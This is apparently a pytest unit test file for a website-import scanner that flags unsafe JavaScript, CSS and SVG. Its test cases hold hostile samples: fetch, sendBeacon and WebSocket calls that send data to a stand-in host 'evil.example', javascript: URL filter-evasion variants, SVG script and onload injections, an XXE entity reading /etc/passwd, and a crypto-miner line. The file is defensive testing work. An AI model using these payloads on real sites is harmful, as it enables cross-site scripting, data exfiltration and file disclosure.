"""
tests/unit/test_site_import_scan.py
------------------------------------
SITE-IMPORT 1a - the script, CSS and SVG scanners (spec sections 4, 13). Pure functions.
"""
from __future__ import annotations

import pytest

from app.services import site_import_scan as scan

HOSTS = ("cdn.jsdelivr.net", "fonts.googleapis.com")


def rules(findings, severity=None):
    return sorted({f["rule"] for f in findings if severity is None or f["severity"] == severity})


class TestClassifyUrl:
    @pytest.mark.parametrize("url,expected", [
        ("", "empty"), ("#top", "anchor"), ("css/app.css", "local"), ("/img/a.png?v=2", "local"),
        ("https://cdn.jsdelivr.net/npm/x.js", "external_allowed"), ("//cdn.jsdelivr.net/x.js", "external_allowed"),
        ("https://sub.cdn.jsdelivr.net/x.js", "external_allowed"),
        ("https://evil.example/x.js", "external_unknown"), ("//evil.example/x.js", "external_unknown"),
        ("https://cdn.jsdelivr.net.evil.example/x.js", "external_unknown"),
        ("javascript:alert(1)", "js_scheme"), ("JaVaScRiPt:alert(1)", "js_scheme"), ("java\tscript:alert(1)", "js_scheme"),
        (" \n javascript:alert(1)", "js_scheme"), ("vbscript:x", "js_scheme"),
        ("data:image/png;base64,AAAA", "data"), ("mailto:a@b.co", "other_scheme"), ("tel:+234800", "other_scheme"),
    ])
    def test_classes(self, url, expected):
        assert scan.classify_url(url, HOSTS) == expected


class TestScanJs:
    def test_clean_script_has_no_findings(self):
        js = "document.querySelector('.nav').addEventListener('click', function(){ document.body.classList.toggle('open'); });"
        assert scan.scan_js(js, "js/app.js", HOSTS) == []

    @pytest.mark.parametrize("code,rule", [
        ("eval('1+1')", "eval"),
        ("var f = new Function('return 1')", "new_function"),
        ("document.cookie = 'a=1'", "document_cookie"),
        ("var c = document['cookie']", "document_cookie"),
        ("localStorage.setItem('a','b')", "web_storage"),
        ("sessionStorage.getItem('a')", "web_storage"),
        ("indexedDB.open('x')", "web_storage"),
        ("var s = document.createElement('script'); s.src = 'x.js'", "dynamic_script_element"),
        ("document.createElement('iframe')", "dynamic_iframe_element"),
        ("new Worker('w.js')", "worker"),
        ("importScripts('a.js')", "worker"),
        ("document.write('<scr' + 'ipt src=x></script>')", "document_write"),
        ("document.write('<script src=x></script>')", "document_write_script"),
        ("var m = new CoinHive.Anonymous('key')", "crypto_miner"),
        ("fetch('https://evil.example/collect', {method:'POST'})", "network_blocked"),
        ("fetch('//evil.example/c')", "network_blocked"),
        ("navigator.sendBeacon('https://evil.example/b', data)", "network_blocked"),
        ("new WebSocket('wss://evil.example/s')", "network_blocked"),
        ("var x = new XMLHttpRequest(); x.open('GET', 'https://evil.example/d')", "network_blocked"),
        ("import('https://evil.example/m.js')", "remote_import"),
        ("import x from 'https://evil.example/m.js';", "remote_import"),
        ("var p = atob('" + "QUJD" * 120 + "')", "obfuscated_payload"),
    ])
    def test_blocked_patterns(self, code, rule):
        found = scan.scan_js(code, "js/x.js", HOSTS)
        assert rule in rules(found), found
        assert rule in rules(found, "error") or scan.RULES[rule][0] == "warning"

    @pytest.mark.parametrize("code,rule", [
        ("setTimeout('doIt()', 100)", "string_timer"),
        ("el.innerHTML = '<b>x</b>'", "inner_html"),
        ("window.open('https://wa.me/234800')", "window_open"),
        ("parent.postMessage('x', '*')", "post_message"),
        ("top.location = 'https://x.example'", "top_location"),
        ("fetch(url)", "network_dynamic"),
        ("var x = new XMLHttpRequest(); x.open('GET', url)", None),
    ])
    def test_warning_patterns(self, code, rule):
        found = scan.scan_js(code, "js/x.js", HOSTS)
        assert not rules(found, "error") or rule is None
        if rule:
            assert rule in rules(found, "warning"), found

    def test_allowed_and_local_network_calls_pass(self):
        js = ("fetch('data/menu.json'); fetch('/api/x'); fetch('https://cdn.jsdelivr.net/npm/a.json');"
              "import('./mod.js');")
        assert rules(scan.scan_js(js, "js/x.js", HOSTS), "error") == []

    def test_comments_are_ignored_but_urls_with_slashes_are_not_mistaken_for_comments(self):
        js = "/* eval('x') */\n// document.cookie\nvar u = 'https://cdn.jsdelivr.net/x'; // done\nlocalStorage.x = 1"
        found = scan.scan_js(js, "js/x.js", HOSTS)
        assert rules(found) == ["web_storage"]
        assert found[0]["line"] == 4

    def test_line_numbers_and_one_finding_per_rule_and_line(self):
        found = scan.scan_js("var a=1;\n\neval('x'); eval('y');", "js/x.js", HOSTS)
        assert [(f["rule"], f["line"]) for f in found] == [("eval", 3)]

    def test_empty_input(self):
        assert scan.scan_js("", "x.js", HOSTS) == [] and scan.scan_js("   \n ", "x.js", HOSTS) == []

    def test_overridable_flags(self):
        assert all(f["overridable"] for f in scan.scan_js("eval('x')", "a.js", HOSTS))
        assert not any(f["overridable"] for f in scan.scan_js("document.cookie='a'", "a.js", HOSTS))
        assert not any(f["overridable"] for f in scan.scan_js("fetch('https://evil.example/x')", "a.js", HOSTS))


class TestScanCss:
    def test_collects_urls_imports_and_fonts(self):
        css = ("@import 'base.css'; @import url(https://fonts.googleapis.com/css?family=X);"
               "@font-face{font-family:A;src:url('fonts/a.woff2') format('woff2'), url(fonts/a.woff)}"
               ".h{background:url(img/h.jpg)} @media (max-width:600px){.h{background-image:url(\"img/m.jpg\")}}"
               ".i{background:image-set('img/s.png' 1x)}")
        found, refs = scan.scan_css(css, "css/a.css", HOSTS)
        assert found == []
        urls = [r["url"] for r in refs]
        for u in ("base.css", "https://fonts.googleapis.com/css?family=X", "fonts/a.woff2", "fonts/a.woff", "img/h.jpg",
                  "img/m.jpg", "img/s.png"):
            assert u in urls, urls
        assert {r["via"] for r in refs if r["url"] in ("base.css",)} == {"import"}

    @pytest.mark.parametrize("css", [
        ".a{width:expression(alert(1))}", ".a{behavior:url(x.htc)}", ".a{-moz-binding:url(x.xml#y)}",
    ])
    def test_expression_family_is_an_error(self, css):
        assert "css_expression" in rules(scan.scan_css(css, "a.css", HOSTS)[0], "error")

    def test_javascript_url_in_css(self):
        found, _ = scan.scan_css(".a{background:url(javascript:alert(1))}", "a.css", HOSTS)
        assert "css_js_url" in rules(found, "error")

    def test_garbage_does_not_raise(self):
        scan.scan_css("}{ @@@ ;;; url( ", "a.css", HOSTS)
        scan.scan_css("", "a.css", HOSTS)

    def test_deep_nesting_does_not_blow_the_stack(self):
        scan.scan_css(".a{" * 500 + "color:red" + "}" * 500, "a.css", HOSTS)


class TestScanSvg:
    @pytest.mark.parametrize("svg", [
        "<svg><script>alert(1)</script></svg>", "<svg onload='x()'></svg>", "<svg><foreignObject/></svg>",
        "<svg><a href='javascript:x()'/></svg>", "<!DOCTYPE svg [<!ENTITY x SYSTEM 'file:///etc/passwd'>]><svg/>",
        "<svg><use href='https://evil.example/s.svg#a'/></svg>", "<svg><image href='//evil.example/a.png'/></svg>",
        "<svg><iframe src=x /></svg>",
    ])
    def test_unsafe(self, svg):
        assert "svg_unsafe" in rules(scan.scan_svg(svg, "i.svg"), "error")

    def test_safe(self):
        assert scan.scan_svg("<svg viewBox='0 0 1 1'><path d='M0 0L1 1'/><use href='#a'/></svg>", "i.svg") == []
